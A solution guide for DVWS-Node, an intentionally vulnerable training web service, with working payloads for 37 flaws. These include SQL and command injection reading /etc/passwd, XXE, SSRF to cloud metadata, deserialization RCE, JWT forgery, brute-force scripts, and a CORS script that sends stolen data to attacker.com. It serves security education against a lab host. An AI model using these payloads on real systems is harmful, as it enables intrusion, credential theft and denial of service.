# DVWS-Node Challenge Guide

Damn Vulnerable Web Service (DVWS-Node) is a deliberately insecure web application for learning API and web service security testing. All services run on a single Express server.

**Base URL:** `http://dvws.local`

| Service   | Path                 | Description                       |
|-----------|----------------------|-----------------------------------|
| REST API  | `/api/v1/*`, `/api/v2/*` | Primary REST endpoints        |
| SOAP      | `/dvwsuserservice`   | SOAP/XML service with WSDL        |
| XML-RPC   | `/xmlrpc`            | XML-RPC method dispatch            |
| GraphQL   | `/graphql`           | GraphQL queries and mutations      |
| Swagger   | `/api-docs`          | OpenAPI documentation              |

**Default credentials:** `admin` / `letmein`, `test` / `test`

---

## Table of Contents

1. [SQL Injection](#1-sql-injection)
2. [NoSQL Injection](#2-nosql-injection)
3. [OS Command Injection](#3-os-command-injection)
4. [XML External Entity Injection (XXE)](#4-xml-external-entity-injection-xxe)
5. [XML Bomb (Denial of Service)](#5-xml-bomb-denial-of-service)
6. [Server-Side Request Forgery (SSRF)](#6-server-side-request-forgery-ssrf)
7. [Insecure Deserialization (RCE)](#7-insecure-deserialization-rce)
8. [XPath Injection](#8-xpath-injection)
9. [LDAP Injection](#9-ldap-injection)
10. [Path Traversal](#10-path-traversal)
11. [SOAP Injection](#11-soap-injection)
12. [XML Injection (Profile Export)](#12-xml-injection-profile-export)
13. [XML Injection (Profile Import / Mass Assignment)](#13-xml-injection-profile-import--mass-assignment)
14. [Mass Assignment (User Registration)](#14-mass-assignment-user-registration)
15. [IDOR - Insecure Direct Object Reference](#15-idor---insecure-direct-object-reference)
16. [Broken Authentication - JWT "none" Algorithm](#16-broken-authentication---jwt-none-algorithm)
17. [JWT Secret Key Brute Force](#17-jwt-secret-key-brute-force)
18. [Vertical Access Control (Privilege Escalation)](#18-vertical-access-control-privilege-escalation)
19. [Horizontal Access Control](#19-horizontal-access-control)
20. [Open Redirect](#20-open-redirect)
21. [Cross-Site Scripting (XSS)](#21-cross-site-scripting-xss)
22. [Cross-Site Request Forgery (CSRF)](#22-cross-site-request-forgery-csrf)
23. [CORS Misconfiguration](#23-cors-misconfiguration)
24. [CRLF Injection / Log Pollution](#24-crlf-injection--log-pollution)
25. [User Enumeration](#25-user-enumeration)
26. [Information Disclosure](#26-information-disclosure)
27. [Sensitive Data Exposure (Password Hashes)](#27-sensitive-data-exposure-password-hashes)
28. [Prototype Pollution](#28-prototype-pollution)
29. [API Endpoint Brute Forcing (Missing Rate Limit)](#29-api-endpoint-brute-forcing-missing-rate-limit)
30. [Rate Limit Bypass via X-Forwarded-For](#30-rate-limit-bypass-via-x-forwarded-for)
31. [Hidden API Functionality Exposure](#31-hidden-api-functionality-exposure)
32. [GraphQL Introspection](#32-graphql-introspection)
33. [GraphQL Access Control Issues](#33-graphql-access-control-issues)
34. [GraphQL Arbitrary File Write](#34-graphql-arbitrary-file-write)
35. [GraphQL Batching Brute Force](#35-graphql-batching-brute-force)
36. [GraphQL Sensitive Data Exposure](#36-graphql-sensitive-data-exposure)
37. [Unrestricted File Upload](#37-unrestricted-file-upload)

---

## 1. SQL Injection

**Endpoint:** `POST /api/v2/passphrase` and `GET /api/v2/passphrase/:username`

**Description:** User input is concatenated directly into raw SQL queries without parameterization.

### Challenge

Save a passphrase and then retrieve passphrases for a user you do not own.

### Solution

**Blind SQLi on the GET endpoint** -- the `:username` parameter is injected directly into a `SELECT` query:

```
GET /api/v2/passphrase/' OR '1'='1 HTTP/1.1
Host: dvws.local
```

This returns all passphrases in the database because the query becomes:
```sql
SELECT passphrase, reminder FROM passphrases WHERE username = '' OR '1'='1'
```

**SQLi on the POST endpoint** -- `passphrase` and `reminder` fields are injected into an `INSERT` statement:

```
POST /api/v2/passphrase HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: application/json

{
  "passphrase": "test', 'injected'); -- ",
  "reminder": "ignored"
}
```

---

## 2. NoSQL Injection

**Endpoint:** `POST /api/v2/notesearch`

**Description:** The search parameter is embedded directly into a MongoDB `$where` JavaScript expression.

### Challenge

Retrieve all notes in the database, not just public ones matching your search.

### Solution

```
POST /api/v2/notesearch HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: application/json

{
  "search": "' || '1'=='1"
}
```

The injected value breaks out of the string comparison and makes the `$where` clause always true:
```js
// Becomes: this.type == 'public' && this.name == '' || '1'=='1'
```

---

## 3. OS Command Injection

**Endpoint:** `GET /api/v2/sysinfo/:command`

**Description:** The `:command` parameter is passed directly to `child_process.exec()`.

### Challenge

Execute arbitrary OS commands on the server.

### Solution

```
GET /api/v2/sysinfo/uname;cat%20/etc/passwd HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
```

The semicolon terminates the first command and `cat /etc/passwd` executes as a second command. Other metacharacters also work: `|`, `&&`, backticks, `$()`.

---

## 4. XML External Entity Injection (XXE)

**Endpoint:** `POST /dvwsuserservice`

**Description:** The SOAP service parses XML with `libxmljs2` using `noent: true` and `dtdload: true`, enabling external entity resolution.

### Challenge

Read arbitrary files from the server via the SOAP user lookup service.

### Solution

Discover the WSDL first:
```
GET /dvwsuserservice?wsdl HTTP/1.1
Host: dvws.local
```

Then send a malicious SOAP request with an XXE payload:

```xml
POST /dvwsuserservice HTTP/1.1
Host: dvws.local
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <username>&xxe;</username>
  </soapenv:Body>
</soapenv:Envelope>
```

The contents of `/etc/passwd` are returned in the `<username>` field of the SOAP response.

---

## 5. XML Bomb (Denial of Service)

**Endpoint:** `POST /api/v2/notes/import/xml`

**Description:** The XML notes import parses XML with `noent: true`, `dtdload: true`, and `huge: true`, disabling parser size limits.

### Challenge

Cause a denial-of-service condition by importing a specially crafted XML document.

### Solution

**Quadratic Blowup Attack:**

```
POST /api/v2/notes/import/xml HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: application/json

{
  "xml": "<?xml version=\"1.0\"?><!DOCTYPE notes [<!ENTITY a \"AAAAAAAAAA... (repeat thousands of times)\">]><notes><note><name>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</name><body>boom</body></note></notes>"
}
```

The `huge: true` flag removes parser safety limits, allowing memory exhaustion.

**XXE variant (file read via notes import):**

```json
{
  "xml": "<?xml version=\"1.0\"?><!DOCTYPE notes [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><notes><note><name>&xxe;</name><body>stolen</body></note></notes>"
}
```

---

## 6. Server-Side Request Forgery (SSRF)

**Endpoint:** `POST /xmlrpc`

**Description:** The `dvws.CheckUptime` XML-RPC method makes HTTP requests to any user-supplied URL using `needle.get()`.

### Challenge

Use the XML-RPC service to make requests to internal services or cloud metadata endpoints.

### Solution

First, list available methods:
```xml
POST /xmlrpc HTTP/1.1
Host: dvws.local
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params/>
</methodCall>
```

Then exploit SSRF with `dvws.CheckUptime`:
```xml
POST /xmlrpc HTTP/1.1
Host: dvws.local
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>dvws.CheckUptime</methodName>
  <params>
    <param>
      <value><string>http://169.254.169.254/latest/meta-data/</string></value>
    </param>
  </params>
</methodCall>
```

This makes the server fetch the AWS metadata endpoint (or any internal URL).

---

## 7. Insecure Deserialization (RCE)

**Endpoint:** `POST /api/v2/export`

**Description:** The export endpoint Base64-decodes the `data` field and passes it to `node-serialize`'s `unserialize()`, which executes JavaScript IIFE expressions embedded in serialized objects.

### Challenge

Achieve remote code execution on the server through the PDF export feature.

### Solution

Craft a serialized payload with an IIFE (Immediately Invoked Function Expression):

```js
// Malicious serialized object:
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
```

Base64-encode it and send:

```
POST /api/v2/export HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: application/json

{
  "data": "eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2lkJyl9KCkifQ==",
  "username": "test",
  "password": "test"
}
```

The function executes during deserialization before any further processing.

---

## 8. XPath Injection

**Endpoint:** `GET /api/v2/release/:release`

**Description:** The `:release` parameter is concatenated directly into an XPath expression that queries `fixtures/xml/config.xml`.

### Challenge

Extract all data from the server's XML configuration file.

### Solution

```
GET /api/v2/release/0.0.1'%20or%201=1%20or%20'a'='a HTTP/1.1
Host: dvws.local
```

The XPath query becomes:
```xpath
//config/*[local-name(.)='release' and //config//release/text()='0.0.1' or 1=1 or 'a'='a']
```

This returns all nodes from `fixtures/xml/config.xml`, including database credentials and other sensitive configuration.

---

## 9. LDAP Injection

**Endpoint:** `GET /api/v2/users/ldap-search?user=<input>` or `POST /api/v2/users/ldap-search`

**Description:** The `user` parameter is concatenated directly into an LDAP filter string `(uid=<input>)` without sanitization.

### Challenge

Enumerate all LDAP users and extract sensitive attributes.

### Solution

**Wildcard injection to enumerate all users:**
```
GET /api/v2/users/ldap-search?user=* HTTP/1.1
Host: dvws.local
```

Returns: `["admin", "guest", "manager"]`

**Attribute injection to extract sensitive data:**
```
GET /api/v2/users/ldap-search?user=admin)(objectClass=*) HTTP/1.1
Host: dvws.local
```

The filter becomes `(uid=admin)(objectClass=*)` which triggers verbose output including email, GUID, description, and password fields.

---

## 10. Path Traversal

**Endpoint:** `POST /api/download`

**Description:** The `filename` parameter is passed to `path.resolve()` without sanitization, allowing directory traversal.

### Challenge

Download arbitrary files from the server filesystem.

### Solution

```
POST /api/download HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: application/json

{
  "filename": "../../../../../../../../etc/passwd"
}
```

The `../` sequences escape the upload directory and `path.resolve()` resolves them to an absolute path, allowing arbitrary file reads.

---

## 11. SOAP Injection

**Endpoint:** `POST /dvwsuserservice`

**Description:** The username value extracted from the SOAP request is interpolated directly into the XML response without escaping. An attacker can inject XML tags to spoof response fields.

### Challenge

Manipulate the SOAP response to show an elevated role.

### Solution

```xml
POST /dvwsuserservice HTTP/1.1
Host: dvws.local
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <username>test</username><role>admin</role><username>ignore</username>
  </soapenv:Body>
</soapenv:Envelope>
```

The response XML contains a spoofed `<role>admin</role>` element injected between the real tags. A naive XML consumer that reads the first `<role>` element will see "admin" instead of the real role.

---

## 12. XML Injection (Profile Export)

**Endpoint:** `POST /api/v2/users/profile/export/xml`

**Description:** User-supplied `username` and `bio` fields are interpolated directly into an XML string without encoding.

### Challenge

Inject arbitrary XML tags into the exported profile to escalate your role.

### Solution

```
POST /api/v2/users/profile/export/xml HTTP/1.1
Host: dvws.local
Content-Type: application/json

{
  "username": "test</username><role>admin</role><username>ignored",
  "bio": "normal bio"
}
```

The response XML will contain:
```xml
<userProfile>
  <username>test</username><role>admin</role><username>ignored</username>
  <role>user</role>
  <bio>normal bio</bio>
</userProfile>
```

An XML consumer reading the first `<role>` tag will see "admin".

---

## 13. XML Injection (Profile Import / Mass Assignment)

**Endpoint:** `POST /api/v2/users/profile/import/xml`

**Description:** The XML profile import endpoint has no authentication and blindly accepts an `<admin>` field, allowing privilege escalation for any user.

### Challenge

Escalate a regular user to admin without knowing their password.

### Solution

```
POST /api/v2/users/profile/import/xml HTTP/1.1
Host: dvws.local
Content-Type: application/json

{
  "xml": "<userProfile><username>test</username><admin>true</admin><bio>hacked</bio></userProfile>"
}
```

Response:
```json
{
  "success": true,
  "message": "Profile updated successfully from XML.",
  "data": { "username": "test", "admin": true, ... }
}
```

No authentication required. The `<admin>true</admin>` field is blindly accepted and written to the database.

---

## 14. Mass Assignment (User Registration)

**Endpoint:** `POST /api/v2/users`

**Description:** The entire `req.body` is passed directly to `new User(req.body)`. Since the Mongoose schema includes an `admin` field, it can be set at registration time.

### Challenge

Register a new user account with admin privileges.

### Solution

```
POST /api/v2/users HTTP/1.1
Host: dvws.local
Content-Type: application/json

{
  "username": "attacker",
  "password": "password123",
  "admin": true
}
```

The new user is created with `admin: true`. Logging in will return a JWT with `user:admin` permission.

---

## 15. IDOR - Insecure Direct Object Reference

**Endpoint:** `GET /api/v2/notes/:noteId`, `PUT /api/v2/notes/:noteId`, `DELETE /api/v2/notes/:noteId`

**Description:** Notes are accessed by their sequential numeric `no` field. No ownership check is performed -- any authenticated user can read, modify, or delete any other user's notes.

### Challenge

Access another user's private notes by enumerating IDs.

### Solution

```
GET /api/v2/notes/1 HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
```

Increment the ID to enumerate: `/api/v2/notes/2`, `/api/v2/notes/3`, etc. Private notes (type != "public") belonging to other users are returned without restriction.

Delete another user's note:
```
DELETE /api/v2/notes/targetNoteName HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
```

---

## 16. Broken Authentication - JWT "none" Algorithm

**Endpoint:** All authenticated endpoints

**Description:** JWT verification accepts `algorithms: ["HS256", "none"]` and `ignoreExpiration: true`. The `none` algorithm means the signature is not verified.

### Challenge

Forge a JWT token to authenticate as any user, including admin.

### Solution

1. Take any valid JWT and decode the payload (Base64):
   ```json
   {"user": "test", "permissions": ["user:read", "user:write"]}
   ```

2. Modify the header to use `"alg": "none"` and set the payload to admin:
   ```
   Header:  {"alg": "none", "typ": "JWT"}
   Payload: {"user": "admin", "permissions": ["user:read", "user:write", "user:admin"]}
   ```

3. Base64url-encode both parts, join with `.`, and append a trailing `.` (empty signature):
   ```
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJwZXJtaXNzaW9ucyI6WyJ1c2VyOnJlYWQiLCJ1c2VyOndyaXRlIiwidXNlcjphZG1pbiJdfQ.
   ```

4. Use this forged token in the `Authorization: Bearer <token>` header.

---

## 17. JWT Secret Key Brute Force

**Endpoint:** All authenticated endpoints

**Description:** The JWT signing secret is a weak, dictionary-guessable value.

### Challenge

Brute-force the JWT secret key to forge arbitrary tokens.

### Solution

```python
import jwt

token = "<captured-jwt-token>"
wordlist = open("wordlist.txt").read().splitlines()

for word in wordlist:
    try:
        decoded = jwt.decode(token, word, algorithms=["HS256"])
        print(f"Secret found: {word}")
        print(f"Decoded: {decoded}")
        break
    except jwt.InvalidSignatureError:
        continue
```

The secret key is `access`. Once found, forge admin tokens:

```python
import jwt
payload = {
    "user": "admin",
    "permissions": ["user:read", "user:write", "user:admin"]
}
token = jwt.encode(payload, "access", algorithm="HS256")
print(token)
```

---

## 18. Vertical Access Control (Privilege Escalation)

**Endpoints:** `GET /api/v2/sysinfo/uname`, `GET /api/v2/users`, `POST /dvwsuserservice`

**Description:** Admin-only functionality is accessible to regular users or even unauthenticated users.

### Challenge

Access admin-only endpoints with a regular user token.

### Solution

**System info (should be admin-only):**
```
GET /api/v2/sysinfo/uname HTTP/1.1
Host: dvws.local
Authorization: Bearer <regular-user-token>
```

**All user data including password hashes:**
```
GET /api/v2/users HTTP/1.1
Host: dvws.local
Authorization: Bearer <regular-user-token>
```

**SOAP service (no authentication at all):**
```xml
POST /dvwsuserservice HTTP/1.1
Host: dvws.local
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <username>admin</username>
  </soapenv:Body>
</soapenv:Envelope>
```

---

## 19. Horizontal Access Control

**Endpoints:** `GET /api/v2/passphrase/:username`, `GET /api/v2/notes/:noteId`

**Description:** Users can access other users' data. The passphrase endpoint requires no authentication at all.

### Challenge

Read another user's passphrases and notes.

### Solution

**Read any user's passphrases (no auth needed):**
```
GET /api/v2/passphrase/admin HTTP/1.1
Host: dvws.local
```

**Read any user's notes (any valid token works):**
```
GET /api/v2/notes/1 HTTP/1.1
Host: dvws.local
Authorization: Bearer <any-valid-token>
```

---

## 20. Open Redirect

**Endpoint:** `GET /api/v2/users/logout/:redirect`

**Description:** The `:redirect` parameter is passed directly to `res.redirect()` with an `http://` prefix.

### Challenge

Redirect a user to a malicious site via the logout endpoint.

### Solution

```
GET /api/v2/users/logout/evil.com HTTP/1.1
Host: dvws.local
```

Response: `302 Found` with `Location: http://evil.com`

Craft a phishing link: `http://dvws.local/api/v2/users/logout/attacker.com/phishing`

---

## 21. Cross-Site Scripting (XSS)

### 21a. XML XSS via SOAP Service

**Endpoint:** `POST /dvwsuserservice`

The SOAP response reflects the username value. If a client-side application renders this XML without sanitization, the user can inject HTML:

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <username>&lt;script&gt;alert(1)&lt;/script&gt;</username>
  </soapenv:Body>
</soapenv:Envelope>
```

If the front-end decodes the XML entities and renders the result with `innerHTML`, the script executes.

### 21b. Content-Type XSS

**Endpoint:** `POST /api/v2/users`

The registration response reflects the username with `Content-Type: text/plain` but no explicit `X-Content-Type-Options: nosniff` header. Register with:

```json
{
  "username": "<script>alert(1)</script>",
  "password": "test"
}
```

Browsers that perform MIME sniffing may execute the script.

---

## 22. Cross-Site Request Forgery (CSRF)

**Endpoint:** `POST /api/v2/admin/create-user`

**Description:** This endpoint reads authentication from an `HttpOnly` cookie (`auth_token`) and accepts `Content-Type: text/plain`, bypassing CORS preflight checks.

### Challenge

Create an admin user by tricking a logged-in admin into visiting a malicious page.

### Solution

Host this HTML on an attacker-controlled page:

```html
<html>
<body>
<script>
fetch('http://dvws.local/api/v2/admin/create-user', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({
        username: 'hacker_admin',
        password: 'hacked',
        admin: true
    })
});
</script>
</body>
</html>
```

When an admin visits this page, their `auth_token` cookie is included automatically. The endpoint parses JSON from `text/plain` bodies, creating the attacker's admin account.

---

## 23. CORS Misconfiguration

**Endpoint:** All endpoints

**Description:** CORS is configured with `origin: true` (reflects any origin) and `credentials: true`, allowing any website to make authenticated cross-origin requests.

### Challenge

Steal data from the API cross-origin.

### Solution

Host on attacker-controlled domain:

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://dvws.local/api/v2/passphrase/admin', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Send stolen data to attacker server
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(xhr.responseText));
};
xhr.send();
</script>
```

The server reflects the attacker's origin in `Access-Control-Allow-Origin` and sets `Access-Control-Allow-Credentials: true`, so the browser allows the cross-origin response to be read.

---

## 24. CRLF Injection / Log Pollution

**Endpoint:** `POST /api/v2/login`

**Description:** The username from login attempts is logged without sanitizing newline characters. Logs are viewable at `GET /api/v2/admin/logs`.

### Challenge

Forge a fake log entry showing a successful admin login from a different IP.

### Solution

```
POST /api/v2/login HTTP/1.1
Host: dvws.local
Content-Type: application/json

{
  "username": "attacker\n[2026-01-01T00:00:00.000Z] Login attempt from IP:10.0.0.1 User:admin",
  "password": "anything"
}
```

View the poisoned logs:
```
GET /api/v2/admin/logs HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
```

The injected newline creates a fake log line that appears to show a login from a different IP.

---

## 25. User Enumeration

### 25a. Via Login API

**Endpoint:** `POST /api/v2/login`

```
POST /api/v2/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": "wrong"}
```

- **Existing user:** `401` with `"Authentication error"`
- **Non-existent user:** `404` with `"Login Failed! User foobar not found!"`

The different status codes and messages reveal whether a username exists.

### 25b. Via SOAP Service

**Endpoint:** `POST /dvwsuserservice`

```xml
POST /dvwsuserservice HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <username>admin</username>
  </soapenv:Body>
</soapenv:Envelope>
```

The SOAP response contains the user's role (`admin` or `user`) confirming the account exists.

---

## 26. Information Disclosure

### 26a. Environment Variables

**Endpoint:** `GET /api/v1/info`

```
GET /api/v1/info HTTP/1.1
Host: dvws.local
```

Returns `process.env` (database credentials, JWT secret, etc.), Node.js version, OpenSSL version, platform details, and module load list. Note: `/api/v2/info` returns 403, but v1 is unprotected.

### 26b. Stack Traces

Send malformed requests to various endpoints to trigger unhandled errors. Stack traces reveal file paths, framework versions, and internal structure.

### 26c. Technology Fingerprinting

The `X-Powered-By: Express` header is present on all responses by default.

---

## 27. Sensitive Data Exposure (Password Hashes)

**Endpoint:** `GET /api/v2/users` and `POST /graphql`

### Challenge

Retrieve bcrypt password hashes for all users.

### Solution

**Via REST API:**
```
GET /api/v2/users HTTP/1.1
Host: dvws.local
Authorization: Bearer <any-valid-token>
```

Returns all user documents including `password` (bcrypt hash) fields.

**Via GraphQL:**
```graphql
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "{ userFindbyId(id: \"<user-id>\") { id username password admin } }"
}
```

The `User` GraphQL type exposes the `password` field containing the bcrypt hash.

---

## 28. Prototype Pollution

**Endpoint:** `POST /api/upload`

**Description:** A custom `merge()` function recursively merges user-supplied JSON metadata into an object without checking for `__proto__` or `constructor` keys.

### Challenge

Pollute `Object.prototype` to affect all objects in the application.

### Solution

```
POST /api/upload HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="metadata"

{"__proto__": {"isAdmin": true}}
------Boundary
Content-Disposition: form-data; name="file"; filename="test.xml"
Content-Type: text/xml

<test/>
------Boundary--
```

After this request, every new object in the application inherits `isAdmin: true` from `Object.prototype`.

A more destructive payload:
```json
{"__proto__": {"toString": "POLLUTED"}}
```

This overwrites `Object.prototype.toString`, causing `TypeError` crashes across the application (DoS).

---

## 29. API Endpoint Brute Forcing (Missing Rate Limit)

**Endpoint:** `POST /api/v2/export`

**Description:** The export endpoint verifies username + password credentials before generating a PDF, but has no rate limiting (unlike the login endpoint).

### Challenge

Brute-force a user's password through the export endpoint.

### Solution

```python
import requests

url = "http://dvws.local/api/v2/export"
headers = {"Authorization": "Bearer <token>"}

with open("passwords.txt") as f:
    for password in f:
        password = password.strip()
        r = requests.post(url, json={
            "data": "W10=",  # Base64 for "[]"
            "username": "admin",
            "password": password
        }, headers=headers)
        if r.status_code != 401:
            print(f"Password found: {password}")
            break
```

No rate limit is applied, so thousands of attempts can be made rapidly.

---

## 30. Rate Limit Bypass via X-Forwarded-For

**Endpoint:** `POST /api/v2/login`

**Description:** The rate limiter identifies clients by the `X-Forwarded-For` header, which can be spoofed.

### Challenge

Bypass the login rate limit to brute-force credentials.

### Solution

Rotate the `X-Forwarded-For` header with each request:

```python
import requests

url = "http://dvws.local/api/v2/login"

for i in range(1000):
    headers = {"X-Forwarded-For": f"10.0.0.{i % 256}"}
    r = requests.post(url, json={
        "username": "admin",
        "password": f"attempt{i}"
    }, headers=headers)
    if r.status_code == 200:
        print(f"Login successful with attempt {i}")
        break
```

Each spoofed IP gets its own rate limit bucket (100 attempts per 30 seconds), effectively removing the limit.

---

## 31. Hidden API Functionality Exposure

**Endpoint:** `GET /api-docs`

**Description:** Swagger/OpenAPI documentation is publicly accessible and reveals all API endpoints, including those not exposed through the front-end UI.

### Challenge

Discover hidden administrative endpoints.

### Solution

Browse to `http://dvws.local/api-docs/` or fetch the raw spec:

```
GET /openAPI-spec.json HTTP/1.1
Host: dvws.local
```

This reveals endpoints like:
- `GET /api/v1/info` -- server environment variables
- `GET /api/v2/users` -- all user data
- `POST /api/v2/admin/create-user` -- admin user creation
- `GET /api/v2/admin/logs` -- login logs

---

## 32. GraphQL Introspection

**Endpoint:** `POST /graphql`

**Description:** GraphQL introspection is enabled, allowing full schema discovery.

### Challenge

Map the entire GraphQL schema to discover all queries, mutations, and types.

### Solution

```graphql
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"
}
```

Or use a full introspection query to discover:
- **Queries:** `userFindbyId`, `userSearchByUsername`, `noteFindbyId`, `readNote`, `getPassphrase`
- **Mutations:** `updateUserUploadFile`, `userLogin`, `createNote`
- **Types:** `User` (exposes `password` field), `Notebook`, `File`, `Passphrase`

Tools like GraphQL Voyager or InQL can visualize the schema.

---

## 33. GraphQL Access Control Issues

**Endpoint:** `POST /graphql`

**Description:** Several GraphQL resolvers lack proper authorization checks.

### Challenge

Read other users' notes and data through GraphQL.

### Solution

**Read any user's notes (requires any valid token):**
```graphql
{
  "query": "{ readNote(name: \"admin_secret_note\") { name body user type } }"
}
```

**Look up any user (exposes password hash):**
```graphql
{
  "query": "{ userFindbyId(id: \"<user-object-id>\") { username password admin } }"
}
```

**Search any username:**
```graphql
{
  "query": "{ userSearchByUsername(username: \"admin\") { id username admin } }"
}
```

---

## 34. GraphQL Arbitrary File Write

**Endpoint:** `POST /graphql` (mutation: `updateUserUploadFile`)

**Description:** The `filePath` argument is concatenated to the upload directory without sanitization, allowing path traversal to write files anywhere on the filesystem.

### Challenge

Write an arbitrary file to the server filesystem via GraphQL.

### Solution

```graphql
POST /graphql HTTP/1.1
Authorization: Bearer <token>
Content-Type: application/json

{
  "query": "mutation { updateUserUploadFile(filePath: \"../../../../../../tmp/pwned.txt\", fileContent: \"You have been hacked\") { filePath fileContent } }"
}
```

The `../` sequences traverse out of the uploads directory. The file is written to `/tmp/pwned.txt` (or any writable path).

---

## 35. GraphQL Batching Brute Force

**Endpoint:** `POST /graphql`

**Description:** Apollo Server is configured with `allowBatchedHttpRequests: true`, allowing multiple operations in a single HTTP request.

### Challenge

Brute-force passphrase reminders by batching hundreds of queries in one request.

### Solution

```json
POST /graphql HTTP/1.1
Content-Type: application/json

[
  {"query": "{ attempt1: getPassphrase(reminder: \"dog\") { passphrase reminder } }"},
  {"query": "{ attempt2: getPassphrase(reminder: \"cat\") { passphrase reminder } }"},
  {"query": "{ attempt3: getPassphrase(reminder: \"test1\") { passphrase reminder } }"},
  {"query": "{ attempt4: getPassphrase(reminder: \"password\") { passphrase reminder } }"}
]
```

All queries execute in a single HTTP request, bypassing any per-request rate limiting. Scale to hundreds of guesses per batch.

---

## 36. GraphQL Sensitive Data Exposure

**Endpoint:** `POST /graphql` (mutation: `userLogin`)

**Description:** The `userLogin` mutation returns the `password` field, which contains the bcrypt hash.

### Challenge

Extract password hashes via the GraphQL login mutation.

### Solution

```graphql
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "mutation { userLogin(username: \"admin\", password: \"letmein\") { username password token } }"
}
```

Response:
```json
{
  "data": {
    "userLogin": {
      "username": "admin",
      "password": "$2b$10$...<bcrypt hash>...",
      "token": "eyJ..."
    }
  }
}
```

The bcrypt hash is returned alongside the valid JWT token.

---

## 37. Unrestricted File Upload

**Endpoint:** `POST /api/upload`

**Description:** File upload only validates that the filename ends in `.xml`. There is no content-type validation or file content scanning. Files are written to a publicly accessible directory.

### Challenge

Upload a file with malicious content to the server.

### Solution

```
POST /api/upload HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="malicious.xml"
Content-Type: text/xml

<html>
<script>alert(document.cookie)</script>
</html>
------Boundary--
```

The file is saved to `/public/uploads/<username>/malicious.xml` and is directly accessible at `http://dvws.local/uploads/<username>/malicious.xml`. If served with the wrong MIME type or if MIME sniffing occurs, the embedded HTML/JavaScript executes.

---

## Appendix: Quick Reference

### Endpoints by Vulnerability Category

| Category | Endpoints |
|----------|-----------|
| **Injection** | `/api/v2/passphrase`, `/api/v2/notesearch`, `/api/v2/sysinfo/:cmd`, `/dvwsuserservice`, `/api/v2/release/:r`, `/api/v2/users/ldap-search` |
| **Broken Auth** | All authenticated endpoints (JWT none/weak secret) |
| **Data Exposure** | `/api/v1/info`, `/api/v2/users`, `/graphql` (userLogin, userFindbyId) |
| **XXE/XML** | `/dvwsuserservice`, `/api/v2/notes/import/xml`, `/api/v2/users/profile/export/xml`, `/api/v2/users/profile/import/xml` |
| **Access Control** | `/api/v2/notes/:id`, `/api/v2/passphrase/:user`, `/api/v2/sysinfo/:cmd`, `/api/v2/users` |
| **SSRF** | `/xmlrpc` (dvws.CheckUptime) |
| **RCE** | `/api/v2/export` (deserialization), `/api/v2/sysinfo/:cmd` (command injection) |
| **Client-Side** | CORS (all endpoints), CSRF (`/api/v2/admin/create-user`), XSS (various) |
| **GraphQL** | `/graphql` (introspection, IDOR, file write, batching, data exposure) |
